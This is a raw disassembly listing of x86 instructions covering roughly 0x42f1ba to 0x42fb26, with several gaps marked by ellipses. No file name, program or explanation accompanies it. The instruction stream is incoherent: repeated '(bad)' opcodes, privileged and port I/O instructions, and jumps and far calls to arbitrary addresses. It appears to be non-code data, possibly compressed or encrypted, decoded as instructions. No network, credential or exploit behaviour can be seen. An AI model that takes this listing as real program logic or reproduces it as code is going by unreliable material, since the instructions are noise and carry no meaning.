  42f1ba:	cmp    al,0xec
  42f1bc:	mov    eax,0x56d625bf
  42f1c1:	push   ss
  42f1c2:	cld    
  42f1c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1c4:	sub    esi,ebx
  42f1c6:	or     eax,0x6264b60d
  42f1cb:	(bad)  
  42f1cc:	jns    0x42f187
  42f1ce:	pop    es
  42f1cf:	push   eax
  42f1d0:	ret    0xb5ee
  42f1d3:	iret   
  42f1d4:	jae    0x42f170
  42f1d6:	dec    edi
  42f1d7:	(bad)  
  42f1d8:	jmp    0x4073:0xf359b908
  42f1df:	pushf  
  42f1e0:	cmp    DWORD PTR [edx-0x5c],ebx
  42f1e3:	pop    ds
  42f1e4:	xor    eax,0xb96a7c4b
  42f1e9:	jb     0x42f202
  42f1eb:	in     eax,dx
  42f1ec:	arpl   WORD PTR [ecx+0x5aa02c24],dx
  42f1f2:	(bad)  
  42f1f3:	xchg   edx,eax
  42f1f4:	sub    edi,edi
  42f1f6:	jb     0x42f24a
  42f1f8:	outs   dx,DWORD PTR ds:[esi]
  42f1f9:	data16 jg 0x42f1d9
  42f1fc:	or     ecx,DWORD PTR [edx+ecx*2-0x2bb612df]
  42f203:	and    al,BYTE PTR [ebx-0x54]
  42f206:	dec    ebx
  42f207:	in     al,0x65
  42f209:	outs   dx,DWORD PTR ds:[esi]
  42f20a:	mov    ah,0xec
  42f20c:	repnz jmp FWORD PTR [eax+0x13]
  42f210:	das    
  42f211:	inc    edi
  42f212:	lds    edi,FWORD PTR [ecx]
  42f214:	aas    
  42f215:	cli    
  42f216:	(bad)  
  42f218:	int    0x6e
  42f21a:	mov    WORD PTR [edi+0x1e],gs
  42f21d:	lahf   
  42f21e:	jl     0x42f264
  42f220:	iret   
  42f221:	mov    ebx,0xa8f6d631
  42f226:	add    bh,ch
  42f228:	sbb    ebx,ebx
  42f22a:	nop
  42f22b:	enter  0x4ef5,0x9
  42f22f:	sub    BYTE PTR [ebx],ah
  42f231:	and    ebx,ebp
  42f233:	mov    al,ds:0x8b6d8b24
  42f238:	add    DWORD PTR [esp+ecx*8],esp
  42f23b:	jbe    0x42f27e
  42f23d:	xor    ebp,DWORD PTR [eax-0x1c]
  42f240:	std    
  42f241:	jno    0x42f21b
  42f243:	pop    esi
  42f244:	mov    ebx,0x4005b9e5
  42f249:	mov    ds:0xa11faed4,al
  42f24e:	mov    ebx,DWORD PTR [ecx]
  42f250:	sub    eax,DWORD PTR [edx]
  42f252:	lods   al,BYTE PTR ds:[esi]
  42f253:	push   0xa0c5072e
  42f258:	inc    ebp
  42f259:	std    
  42f25a:	add    dh,BYTE PTR [edx+0x7563ce2b]
  42f260:	loopne 0x42f21a
  42f262:	aad    0x55
  42f264:	and    ch,BYTE PTR [esi+0x40762744]
  42f26a:	mov    bh,0xbd
  42f26c:	adc    DWORD PTR [esi+0x37cae86e],esi
  42f272:	adc    DWORD PTR [edx-0x48],eax
  42f275:	and    bl,dl
  42f277:	pop    ebp
  42f278:	and    al,al
  42f27a:	data16 jno 0x42f2a5
  42f27d:	aaa    
  42f27e:	mov    bl,0xda
  42f280:	and    dh,bh
  42f282:	adc    bh,bl
  42f284:	xor    eax,0xfd9a6627
  42f289:	jnp    0x42f20c
  42f28b:	or     DWORD PTR [ebx-0x52],eax
  42f28e:	jns    0x42f229
  42f290:	leave  
  42f291:	mov    dl,0xc4
  42f293:	xor    eax,0x2cb6efca
  42f298:	mov    edi,DWORD PTR [eax]
  42f29a:	into   
  42f29b:	call   0x42796c89
  42f2a0:	xchg   esp,eax
  42f2a1:	test   BYTE PTR [edx],ah
  42f2a3:	imul   eax,esp,0x17
  42f2a6:	pop    edi
  42f2a7:	ror    DWORD PTR [ecx-0x7c31d6fa],0x6a
  42f2ae:	cmp    eax,0x145fe78d
  42f2b3:	test   al,0xe8
	...
  42f315:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f31b:	call   0x6da4:0xb5dd3fbf
  42f322:	cmp    eax,0xe232b4c2
  42f327:	stc    
  42f328:	add    DWORD PTR [eax],eax
  42f32a:	pop    es
  42f32b:	add    DWORD PTR [eax],eax
  42f32d:	add    BYTE PTR [ebp-0x80],bh
  42f330:	fst    QWORD PTR [ebx-0x3]
  42f333:	jg     0x42f360
  42f335:	imul   edx,DWORD PTR [ecx],0x5
  42f338:	or     BYTE PTR [ebx],ch
  42f33a:	inc    ecx
  42f33b:	das    
  42f33c:	out    dx,eax
  42f33d:	sbb    DWORD PTR [edi+0x55cb8d4d],esi
  42f343:	dec    esi
  42f344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f345:	in     eax,dx
  42f346:	fisttp QWORD PTR [ebp+0x58]
  42f349:	and    al,0xde
  42f34b:	pop    es
  42f34c:	xlat   BYTE PTR ds:[ebx]
  42f34d:	jne    0x42f330
  42f34f:	into   
  42f350:	sub    bh,BYTE PTR [eax+0x9]
  42f353:	inc    ebx
  42f354:	(bad)  
  42f355:	bound  ecx,QWORD PTR [eax+0x60]
  42f358:	cmp    BYTE PTR [ecx-0x618e12a],bl
  42f35e:	sbb    al,0xe2
  42f360:	mov    BYTE PTR [ebp-0x2e56ca4],ah
  42f366:	adc    BYTE PTR [ebx-0x4b142f2f],bl
  42f36c:	pop    ebx
  42f36d:	ret    0x85ba
  42f370:	pop    ss
  42f371:	xor    ebp,DWORD PTR [esi+0x3e1a766f]
  42f377:	jge    0x42f3cb
  42f379:	add    eax,0xb9c8638f
  42f37e:	pop    ds
  42f37f:	push   0x11
  42f381:	pushf  
  42f382:	cmp    ah,al
  42f384:	pop    ecx
  42f385:	cmp    eax,DWORD PTR [ecx]
  42f387:	xor    eax,0x9989489d
  42f38c:	sbb    ebx,edi
  42f38e:	and    BYTE PTR [edx+0x38],bl
  42f391:	stc    
  42f392:	fnstcw WORD PTR [edi+esi*4]
  42f395:	ins    DWORD PTR es:[edi],dx
  42f396:	lods   eax,DWORD PTR ds:[esi]
  42f397:	jae    0x42f3e9
  42f399:	mov    bh,0x62
  42f39b:	ins    DWORD PTR es:[edi],dx
  42f39c:	push   ecx
  42f39d:	sub    al,0x6f
  42f39f:	inc    ebp
  42f3a0:	in     al,dx
  42f3a1:	pusha  
  42f3a2:	dec    edi
  42f3a3:	ins    BYTE PTR es:[edi],dx
  42f3a4:	lods   al,BYTE PTR ds:[esi]
  42f3a5:	cld    
  42f3a6:	repnz test eax,0x9ac79b55
  42f3ac:	push   esp
  42f3ad:	adc    esi,edx
  42f3af:	mov    dh,0xa8
  42f3b1:	out    dx,eax
  42f3b2:	jmp    0x42f3c6
  42f3b4:	ins    DWORD PTR es:[edi],dx
  42f3b5:	pop    edi
  42f3b6:	pop    eax
  42f3b7:	test   al,0xbb
  42f3b9:	adc    edi,ebp
  42f3bb:	sub    al,0xf3
  42f3bd:	scas   al,BYTE PTR es:[edi]
  42f3be:	hlt    
  42f3bf:	popa   
  42f3c0:	mov    cl,0x72
  42f3c2:	inc    edi
  42f3c3:	sub    BYTE PTR [edx+0x57],dl
  42f3c6:	daa    
  42f3c7:	dec    ebx
  42f3c8:	and    DWORD PTR [edx+0x1a],esi
  42f3cb:	cmp    ecx,ebx
  42f3cd:	pop    eax
  42f3ce:	add    edi,DWORD PTR [esi+0x1254a937]
  42f3d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3d5:	fdivr  QWORD PTR [edx]
  42f3d7:	inc    edx
  42f3d8:	add    al,0x34
  42f3da:	bound  edx,QWORD PTR [esp+ecx*4+0x7]
  42f3de:	aas    
  42f3df:	pop    ecx
  42f3e0:	dec    ebx
  42f3e1:	repnz mov esp,0xd68f0548
  42f3e7:	pop    ds
  42f3e8:	xor    edx,DWORD PTR [ebx]
  42f3ea:	repz pop eax
  42f3ec:	retf   0xbd89
  42f3ef:	data16 fisub WORD PTR [ebp+0x54]
  42f3f3:	dec    ecx
  42f3f4:	xor    al,0xa
  42f3f6:	xor    BYTE PTR [edx],ah
  42f3f8:	hlt    
  42f3f9:	jge    0x42f38d
  42f3fb:	or     BYTE PTR [eax+0x2],dh
  42f3fe:	sub    bh,BYTE PTR [esi+ecx*2+0x5e6689a4]
  42f405:	pop    eax
  42f406:	ss jo  0x42f3a8
  42f409:	ficomp DWORD PTR [eax]
  42f40b:	dec    esp
  42f40c:	cmp    BYTE PTR [ebx-0x73],bl
  42f40f:	call   0x2b6b:0xf2d0dbbf
  42f416:	inc    edx
  42f417:	pushf  
  42f418:	arpl   WORD PTR [eax+0x6f],bx
  42f41b:	dec    esp
  42f41c:	push   es
  42f41d:	pop    eax
  42f41e:	adc    cl,dl
  42f420:	mov    al,0x80
  42f422:	xchg   edi,eax
  42f423:	mov    esp,0xf00adceb
  42f428:	mov    ebp,0x2f687719
  42f42d:	out    0xf6,eax
  42f42f:	sbb    al,BYTE PTR [esp+edx*1+0x4d]
  42f433:	add    DWORD PTR [eax+eax*1],edx
	...
  42f496:	aaa    
  42f497:	jae    0x42f4e3
  42f499:	cdq    
  42f49a:	dec    esi
  42f49b:	mov    ecx,0x1986fff7
  42f4a0:	jge    0x42f502
  42f4a2:	les    edx,FWORD PTR [edi+0xc]
  42f4a5:	hlt    
  42f4a6:	jmp    0x742f6a5
  42f4ab:	add    DWORD PTR [eax],eax
  42f4ad:	add    BYTE PTR [eax],bl
  42f4af:	cs js  0x42f4c2
  42f4b2:	mov    ah,0x4e
  42f4b4:	jmp    0x7790dd53
  42f4b9:	ds leave 
  42f4bb:	sbb    bl,BYTE PTR ds:0x2b473fab
  42f4c1:	popf   
  42f4c2:	adc    al,al
  42f4c4:	in     eax,0x2a
  42f4c6:	(bad)  
  42f4c7:	mov    eax,0xc573dbb8
  42f4cc:	es cdq 
  42f4ce:	jmp    0xdf92:0xe6ddfee2
  42f4d5:	adc    al,ah
  42f4d7:	sub    BYTE PTR [edx-0x7504e358],cl
  42f4dd:	or     eax,0x96b4a6f2
  42f4e2:	mov    bl,0x43
  42f4e4:	loop   0x42f508
  42f4e6:	or     ch,cl
  42f4e8:	or     DWORD PTR [ebx-0x4f80882],esi
  42f4ee:	aam    0x5b
  42f4f0:	cdq    
  42f4f1:	imul   ebx,esi,0xffffff9d
  42f4f4:	sti    
  42f4f5:	stos   DWORD PTR es:[edi],eax
  42f4f6:	into   
  42f4f7:	push   edx
  42f4f8:	push   ecx
  42f4f9:	xor    al,0xe
  42f4fb:	jge    0x42f4b2
  42f4fd:	(bad)  
  42f4fe:	sub    BYTE PTR [eax],bh
  42f500:	xchg   ebp,eax
  42f501:	or     edi,DWORD PTR [edx-0x37aca136]
  42f507:	hlt    
  42f508:	mov    ds:0x11a74685,eax
  42f50d:	pop    es
  42f50e:	stc    
  42f50f:	fld    TBYTE PTR [ebp-0x874706e]
  42f515:	mov    ah,0x6a
  42f517:	mov    edi,0xd7c4f35e
  42f51c:	jmp    0x72734268
  42f521:	dec    ecx
  42f522:	cdq    
  42f523:	fsub   st(4),st
  42f525:	push   edx
  42f526:	fucomip st,st(2)
  42f528:	scas   eax,DWORD PTR es:[edi]
  42f529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f52a:	retf   
  42f52b:	mov    BYTE PTR [edi-0x5e],al
  42f52e:	adc    ebp,DWORD PTR [ebp-0x7a7fb073]
  42f534:	pop    ebx
  42f535:	jae    0x42f59b
  42f537:	addr16 push esp
  42f539:	push   eax
  42f53a:	mov    al,0x29
  42f53c:	cdq    
  42f53d:	imul   ecx,edx,0x62256dd8
  42f543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f544:	and    al,0xfe
  42f546:	sbb    ch,BYTE PTR [esi+0x68781ed5]
  42f54c:	repnz test BYTE PTR [edx+0x1b],cl
  42f550:	neg    edi
  42f552:	test   DWORD PTR [eax],esp
  42f554:	sub    DWORD PTR [edx],esi
  42f556:	imul   ebp,DWORD PTR [ebx+0x6df02a42],0xb86b499d
  42f560:	(bad)  
  42f561:	lahf   
  42f562:	mov    DWORD PTR [eax+0x19],edx
  42f565:	inc    eax
  42f566:	or     al,ch
  42f568:	cmc    
  42f569:	stc    
  42f56a:	call   0x4a08:0x6507d915
  42f571:	xchg   ebp,eax
  42f572:	(bad)  
  42f573:	jo     0x42f50a
  42f575:	cs inc edx
  42f577:	stos   BYTE PTR es:[edi],al
  42f578:	int3   
  42f579:	lahf   
  42f57a:	lock sub al,BYTE PTR [ecx]
  42f57d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f57e:	push   ebx
  42f57f:	(bad)  
  42f580:	stc    
  42f581:	ret    0xa32b
  42f584:	add    DWORD PTR [edi+0x6b5c87a2],esi
  42f58a:	xor    DWORD PTR [ecx+0x11],edi
  42f58d:	sbb    eax,0xe4b7e13a
  42f592:	leave  
  42f593:	inc    esp
  42f594:	jne    0x42f5a8
  42f596:	call   0xfab674dd
  42f59b:	in     al,dx
  42f59c:	mov    ds:0xda23edc9,eax
  42f5a1:	add    DWORD PTR [esi+0x36],ebp
  42f5a4:	mov    dh,0xd3
  42f5a6:	mov    eax,0xd7eb50f5
  42f5ab:	cmp    al,0x66
  42f5ad:	out    dx,al
  42f5ae:	add    al,0x5d
  42f5b0:	and    al,0x66
  42f5b2:	scas   eax,DWORD PTR es:[edi]
  42f5b3:	dec    edi
  42f5b4:	mov    esp,0x0
	...
  42f615:	add    BYTE PTR [esi],bh
  42f617:	push   esi
  42f618:	into   
  42f619:	nop
  42f61a:	out    dx,al
  42f61b:	cwde   
  42f61c:	jle    0x42f61c
  42f61e:	pop    edx
  42f61f:	or     bh,BYTE PTR [ebx+edx*2-0x1c]
  42f623:	pop    eax
  42f624:	mov    ah,0xc2
  42f626:	lock sti 
  42f628:	add    DWORD PTR [eax],eax
  42f62a:	pop    es
  42f62b:	add    DWORD PTR [eax],eax
  42f62d:	add    BYTE PTR [ebx+0x4cdc7c12],ch
  42f633:	dec    ecx
  42f634:	hlt    
  42f635:	fbstp  TBYTE PTR [ecx+0x70350d02]
  42f63b:	outs   dx,BYTE PTR ds:[esi]
  42f63c:	inc    ecx
  42f63d:	add    dh,dl
  42f63f:	in     eax,dx
  42f640:	call   0xb8c09152
  42f645:	aaa    
  42f646:	jae    0x42f659
  42f648:	mov    esi,0x38119b36
  42f64d:	cmp    BYTE PTR [eax+0x5e],bh
  42f650:	sub    BYTE PTR [eax-0x39],cl
  42f653:	xlat   BYTE PTR ds:[ebx]
  42f654:	push   edx
  42f655:	les    eax,FWORD PTR [esi+ebx*1-0x43b2e8b9]
  42f65c:	daa    
  42f65d:	push   esi
  42f65e:	scas   eax,DWORD PTR es:[edi]
  42f65f:	adc    BYTE PTR [ebx],0x83
  42f662:	in     eax,dx
  42f663:	push   0x927f9296
  42f668:	rcr    ebp,1
  42f66a:	push   eax
  42f66b:	jne    0x42f6a5
  42f66d:	add    eax,0x4e8bbc55
  42f672:	ret    
  42f673:	inc    edi
  42f674:	sbb    eax,0x74dd5f4d
  42f679:	shr    BYTE PTR [esi],0xcd
  42f67c:	jbe    0x42f6c0
  42f67e:	jecxz  0x42f6d1
  42f680:	xor    bl,BYTE PTR [ebx+0x2]
  42f683:	not    ecx
  42f685:	sbb    al,0x36
  42f687:	cwde   
  42f688:	rcl    BYTE PTR [ebx+0x2bbd7d5e],cl
  42f68e:	stos   DWORD PTR es:[edi],eax
  42f68f:	mov    ds:0x8a01a72b,al
  42f694:	inc    eax
  42f695:	test   BYTE PTR [esi-0x3e95f268],ah
  42f69b:	dec    edx
  42f69c:	and    al,0x2b
  42f69e:	dec    ebx
  42f69f:	jne    0x42f6af
  42f6a1:	dec    edi
  42f6a2:	mov    dh,0xed
  42f6a4:	rol    DWORD PTR [ecx-0x4b],cl
  42f6a7:	popf   
  42f6a8:	cs (bad) 
  42f6aa:	imul   edx,ecx,0xcfa0a8f3
  42f6b0:	retf   0xe322
  42f6b3:	popa   
  42f6b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f6b5:	xchg   si,ax
  42f6b7:	mov    al,0xb5
  42f6b9:	cmp    ch,BYTE PTR [ebp-0x17019288]
  42f6bf:	sub    ah,BYTE PTR [edx+ebx*8-0x778c1be2]
  42f6c6:	mov    DWORD PTR [ebx-0x26],ebp
  42f6c9:	daa    
  42f6ca:	inc    eax
  42f6cb:	jg     0x42f74a
  42f6cd:	out    0x93,al
  42f6cf:	test   DWORD PTR [esi+0x2b9d4475],0x25f16879
  42f6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6da:	xor    BYTE PTR [edx+0x4b],dh
  42f6dd:	scas   al,BYTE PTR es:[edi]
  42f6de:	nop
  42f6df:	pop    esp
  42f6e0:	cmc    
  42f6e1:	pop    ecx
  42f6e2:	neg    DWORD PTR [eax]
  42f6e4:	pop    esi
  42f6e5:	call   0xb8828be5
  42f6ea:	stos   BYTE PTR es:[edi],al
  42f6eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6ec:	(bad)  
  42f6ed:	sub    eax,DWORD PTR [ebx]
  42f6ef:	sbb    BYTE PTR [ecx+0x76590694],ah
  42f6f5:	ins    DWORD PTR es:[edi],dx
  42f6f6:	xchg   esi,eax
  42f6f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f6f8:	inc    ecx
  42f6f9:	aad    0x1a
  42f6fb:	mov    dl,0xaf
  42f6fd:	mov    BYTE PTR [edi-0x4f6704c8],dh
  42f703:	fidiv  WORD PTR [edx-0x54]
  42f706:	lods   al,BYTE PTR ds:[esi]
  42f707:	push   ds
  42f708:	inc    edx
  42f709:	out    0xa1,eax
  42f70b:	and    edx,DWORD PTR [edx+0x392937ab]
  42f711:	lods   eax,DWORD PTR ds:[esi]
  42f712:	pop    edx
  42f713:	loopne 0x42f759
  42f715:	cmp    BYTE PTR [esi+0x64514510],dh
  42f71b:	fwait
  42f71c:	test   BYTE PTR [ebp+0x65],0xd9
  42f720:	leave  
  42f721:	fndisi(8087 only) 
  42f723:	in     al,0x12
  42f725:	cld    
  42f726:	pop    ecx
  42f727:	push   ss
  42f728:	xor    eax,0xc5958714
  42f72d:	add    al,0x90
  42f72f:	sub    eax,0x6b7b00ff
  42f734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  42f795:	add    BYTE PTR [ecx-0x5f],dh
  42f798:	(bad)  
  42f799:	test   al,0xd6
  42f79b:	(bad)  
  42f79c:	jg     0x42f797
  42f79e:	in     al,0x8a
  42f7a0:	jmp    0x42f76f
  42f7a2:	les    esp,FWORD PTR [edi-0x1e]
  42f7a5:	maskmovq mm7,mm4
  42f7a8:	add    DWORD PTR [eax],eax
  42f7aa:	pop    es
  42f7ab:	add    DWORD PTR [eax],eax
  42f7ad:	add    BYTE PTR [esp+edi*8-0xca0bbee],ch
  42f7b4:	or     dl,bh
  42f7b6:	(bad)
  42f7b9:	lds    edi,FWORD PTR [ebx+0x4ec8f2ca]
  42f7bf:	adc    edx,DWORD PTR [ebp+0x2050a79e]
  42f7c5:	stos   DWORD PTR es:[edi],eax
  42f7c6:	gs loopne 0x42f760
  42f7c9:	test   al,0xe5
  42f7cb:	adc    BYTE PTR [ebp+0x53],cl
  42f7ce:	sub    dl,0x2d
  42f7d1:	jb     0x42f7ad
  42f7d3:	mov    ebp,0xedb6c699
  42f7d8:	inc    esi
  42f7d9:	inc    esi
  42f7da:	push   ds
  42f7db:	sub    ecx,DWORD PTR [ecx*8+0x5ce5859f]
  42f7e2:	ins    DWORD PTR es:[edi],dx
  42f7e3:	outs   dx,BYTE PTR ds:[esi]
  42f7e4:	pop    ss
  42f7e5:	mov    al,ds:0x7c3ae52c
  42f7ea:	iret   
  42f7eb:	dec    esp
  42f7ec:	inc    edx
  42f7ed:	and    BYTE PTR [esi],bl
  42f7ef:	cld    
  42f7f0:	adc    edi,DWORD PTR [ebp+0x77]
  42f7f3:	lea    eax,[ecx]
  42f7f5:	xchg   DWORD PTR [edi+ebx*4],esi
  42f7f8:	jle    0x42f7a2
  42f7fa:	and    DWORD PTR [edx],ebp
  42f7fc:	js     0x42f7f4
  42f7fe:	xor    ebp,edx
  42f800:	retf   
  42f801:	les    esi,FWORD PTR [ebp-0x519fd019]
  42f807:	cmp    ch,BYTE PTR [ebp+0x5e]
  42f80a:	jle    0x42f796
  42f80c:	imul   ebp,DWORD PTR [esi+0x6e],0x30
  42f810:	push   es
  42f811:	fistp  QWORD PTR [ebx-0x42]
  42f814:	leave  
  42f815:	push   edi
  42f816:	fstp   QWORD PTR [ecx-0x39]
  42f819:	jns    0x42f7f2
  42f81b:	ret    
  42f81c:	mov    BYTE PTR [eax-0x3f6b56f5],0x51
  42f823:	dec    edi
  42f824:	loop   0x42f7ee
  42f826:	out    0x91,eax
  42f828:	(bad)  
  42f829:	dec    esp
  42f82a:	push   es
  42f82b:	inc    edx
  42f82c:	inc    eax
  42f82d:	mov    bh,al
  42f82f:	mov    edi,0xd1fdda4
  42f834:	jmp    0xe3acd53e
  42f839:	mov    DWORD PTR [esi-0x79],edx
  42f83c:	ja     0x42f837
  42f83e:	push   edi
  42f83f:	dec    esi
  42f840:	jmp    0x42f895
  42f842:	xchg   ebp,eax
  42f843:	cmp    al,0x59
  42f845:	fdivr  DWORD PTR [eax]
  42f847:	mov    ebx,0x9579a423
  42f84c:	xchg   esp,eax
  42f84d:	mov    cs,WORD PTR [edi+0x5238cf86]
  42f853:	pop    eax
  42f854:	fwait
  42f855:	clc    
  42f856:	sub    DWORD PTR [eax],eax
  42f858:	inc    ebx
  42f859:	mov    BYTE PTR [edi-0x2fc52c92],dl
  42f85f:	cmp    bh,BYTE PTR [edi]
  42f861:	imul   eax,DWORD PTR [ecx+0x49],0x2d
  42f865:	mov    ?,WORD PTR [edi-0x7f2c37a]
  42f86b:	or     ecx,edx
  42f86d:	lods   eax,DWORD PTR ds:[esi]
  42f86e:	or     edi,DWORD PTR [ecx-0x6b1e5333]
  42f874:	lahf   
  42f875:	iret   
  42f876:	sub    DWORD PTR [edi+0x197f0eb4],0xffffffac
  42f87d:	div    al
  42f87f:	jecxz  0x42f848
  42f881:	les    edx,FWORD PTR [esi-0x180c6d91]
  42f887:	ins    DWORD PTR es:[edi],dx
  42f888:	xor    ebp,DWORD PTR [edi-0x5]
  42f88b:	ds dec ecx
  42f88d:	fistp  QWORD PTR [eax-0x4b48ef31]
  42f893:	pushf  
  42f894:	jbe    0x42f850
  42f896:	retf   0xd565
  42f899:	xchg   esi,eax
  42f89a:	cmp    DWORD PTR [ebx-0x761da301],ebx
  42f8a0:	cmp    BYTE PTR [edx-0x69],bh
  42f8a3:	ds data16 stos BYTE PTR es:[edi],al
  42f8a6:	adc    dh,BYTE PTR [edi-0x26]
  42f8a9:	aaa    
  42f8aa:	and    bh,BYTE PTR [edi+0x62]
  42f8ad:	call   0x664d25aa
  42f8b2:	pop    edi
  42f8b3:	cs add BYTE PTR gs:[eax],al
	...
  42f913:	add    BYTE PTR [eax],al
  42f915:	add    BYTE PTR [esp+esi*2],dl
  42f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f919:	push   ebp
  42f91a:	in     al,0xd5
  42f91c:	cmc    
  42f91d:	jne    0x42f8e0
  42f91f:	ror    DWORD PTR [ecx+0x2fda919c],1
  42f925:	cmp    esi,0x70001fd
  42f92b:	add    DWORD PTR [eax],eax
  42f92d:	add    BYTE PTR [esi+0x19],al
  42f930:	loope  0x42f931
  42f932:	stos   BYTE PTR es:[edi],al
  42f933:	dec    esp
  42f934:	es sti 
  42f936:	ds push es
  42f938:	mov    BYTE PTR [eax+0x46cdbcf1],ch
  42f93e:	sub    ecx,ebx
  42f940:	pop    edi
  42f941:	xchg   ebx,eax
  42f942:	jg     0x42f9b4
  42f944:	repz adc eax,0x5b87251a
  42f94a:	pop    edx
  42f94b:	push   es
  42f94c:	lahf   
  42f94d:	sbb    BYTE PTR [edi+edx*4-0x5d],cl
  42f951:	xchg   DWORD PTR [ebx+ecx*4+0x441a35bf],esi
  42f958:	dec    ebp
  42f959:	mov    esi,0x65774082
  42f95e:	sub    bh,bh
  42f960:	add    dl,BYTE PTR [esi+0x2071a925]
  42f966:	jp     0x42f8fc
  42f968:	pop    eax
  42f969:	jb     0x42f9c1
  42f96b:	cmp    BYTE PTR [ebp+ebx*4+0x18521c2c],bl
  42f972:	pop    esp
  42f973:	into   
  42f974:	dec    ebx
  42f975:	pop    esi
  42f976:	pushf  
  42f977:	lea    ecx,[eax]
  42f979:	nop
  42f97a:	xchg   ebx,eax
  42f97b:	xchg   ebp,eax
  42f97c:	xor    eax,0xf740fed9
  42f981:	adc    BYTE PTR [ebx],ah
  42f983:	in     al,0x10
  42f985:	test   eax,0x60cbb42d
  42f98a:	cmc    
  42f98b:	pop    esp
  42f98c:	xor    dl,bh
  42f98e:	sbb    ebp,DWORD PTR [esi-0x76e45623]
  42f994:	sbb    BYTE PTR [eax],bh
  42f996:	mov    bh,0x88
  42f998:	into   
  42f999:	bound  ebp,QWORD PTR [ecx-0x782bfb1c]
  42f99f:	cmp    BYTE PTR [ebp+ebp*4+0x100cbe1f],0x3b
  42f9a7:	daa    
  42f9a8:	cli    
  42f9a9:	sub    eax,edx
  42f9ab:	addr16 push cs
  42f9ad:	pushf  
  42f9ae:	mov    ch,BYTE PTR [edx-0x78a666ae]
  42f9b4:	std    
  42f9b5:	jnp    0x42f9cd
  42f9b7:	retf   0xda3
  42f9ba:	shl    DWORD PTR [eax-0x29],0xad
  42f9be:	test   BYTE PTR [esi],0x9c
  42f9c1:	mov    dl,0x90
  42f9c3:	iret   
  42f9c4:	add    edx,DWORD PTR [edx-0x46]
  42f9c7:	mov    WORD PTR [esi],ds
  42f9c9:	adc    DWORD PTR [edi+0x69],edi
  42f9cc:	add    al,BYTE PTR [edi-0x6d2c0758]
  42f9d2:	stos   DWORD PTR es:[edi],eax
  42f9d3:	lea    ebx,[ebp-0x5c]
  42f9d6:	jne    0x42f9a9
  42f9d8:	jmp    0xdbc9e392
  42f9dd:	cmp    edx,DWORD PTR [edi]
  42f9df:	cmc    
  42f9e0:	cmp    bl,BYTE PTR [ebp-0x45]
  42f9e3:	pop    edi
  42f9e4:	shl    BYTE PTR [ebx],cl
  42f9e6:	xor    al,0xa5
  42f9e8:	jl     0x42f991
  42f9ea:	sbb    BYTE PTR [ebx],ch
  42f9ec:	ja     0x42f9a5
  42f9ee:	fiadd  DWORD PTR ds:0xcb174540
  42f9f4:	sbb    al,0x15
  42f9f6:	xor    dl,BYTE PTR [ebp+ebp*2+0x5e6ae92f]
  42f9fd:	rcl    BYTE PTR [ebp+0x37],1
  42fa00:	adc    BYTE PTR [eax+0x4c270aca],0xdf
  42fa07:	fild   WORD PTR [ebp-0x16a3b4db]
  42fa0d:	ja     0x42fa71
  42fa0f:	mov    eax,ds:0xc2c0da74
  42fa14:	fwait
  42fa15:	loope  0x42f9c3
  42fa17:	sub    DWORD PTR [ecx+0x2f],ecx
  42fa1a:	push   esp
  42fa1b:	jnp    0x42f9d9
  42fa1d:	and    eax,0xceb75850
  42fa22:	int    0x2f
  42fa24:	cmp    eax,0x8774c07f
  42fa29:	push   ebp
  42fa2a:	xchg   ebx,eax
  42fa2b:	dec    esp
  42fa2c:	adc    ecx,DWORD PTR [ebx-0x13]
  42fa2f:	inc    ecx
  42fa30:	aaa    
  42fa31:	cli    
  42fa32:	cmp    eax,0x37f7
	...
  42fa93:	add    BYTE PTR [eax],al
  42fa95:	add    BYTE PTR [ebx],bl
  42fa97:	out    dx,eax
  42fa98:	shl    BYTE PTR [esi],0xf4
  42fa9b:	aas    
  42fa9c:	(bad)  
  42fa9d:	out    dx,eax
  42fa9e:	sbb    dl,BYTE PTR [esi+eiz*8-0x1c]
  42faa2:	sub    al,0xcd
  42faa4:	mov    esp,0x1ff05c6
  42faa9:	add    BYTE PTR [edi],al
  42faab:	add    DWORD PTR [eax],eax
  42faad:	add    BYTE PTR [ecx+0x73],dh
  42fab0:	xor    ebp,DWORD PTR [ecx]
  42fab2:	adc    edx,DWORD PTR [ecx+0x9]
  42fab5:	js     0x42faa7
  42fab7:	sub    eax,0x184bb1c1
  42fabc:	mov    dl,0xd4
  42fabe:	xor    BYTE PTR [edx-0x30fba488],0x8e
  42fac5:	add    esi,ebx
  42fac7:	sti    
  42fac8:	or     BYTE PTR [eax-0x44],dh
  42facb:	pop    edi
  42facc:	xor    al,0xfd
  42face:	mov    dl,0x98
  42fad0:	test   DWORD PTR [ebx],0x4f134244
  42fad6:	repz mov eax,0x53df864b
  42fadc:	nop
  42fadd:	dec    esp
  42fade:	xchg   esp,eax
  42fadf:	sub    esp,DWORD PTR [ebp+0x5e5baa9]
  42fae5:	sub    al,0xbf
  42fae7:	mov    cl,0x1
  42fae9:	clc    
  42faea:	fistp  DWORD PTR [esi+0x1236ca2]
  42faf0:	dec    edi
  42faf1:	mov    ecx,0x4b29a04b
  42faf6:	imul   BYTE PTR [ecx]
  42faf8:	outs   dx,BYTE PTR ds:[esi]
  42faf9:	mov    al,ds:0x7e20b4df
  42fafe:	mov    cl,0xc6
  42fb00:	jnp    0x42fa94
  42fb02:	stos   BYTE PTR es:[edi],al
  42fb03:	cld    
  42fb04:	loopne 0x42faa3
  42fb06:	mov    ebp,0x3d09633d
  42fb0b:	out    0xe9,eax
  42fb0d:	icebp  
  42fb0e:	retf   0xb568
  42fb11:	or     DWORD PTR [edi+0x1eec0bc3],ecx
  42fb17:	test   al,0xff
  42fb19:	ret    0x1ced
  42fb1c:	(bad)  
  42fb1d:	pushf  
  42fb1e:	repz mov WORD PTR [esi],ss
  42fb21:	and    esi,0x45
  42fb24:	add    ch,cl
  42fb26:	stos   DWORD PTR es:[edi],eax
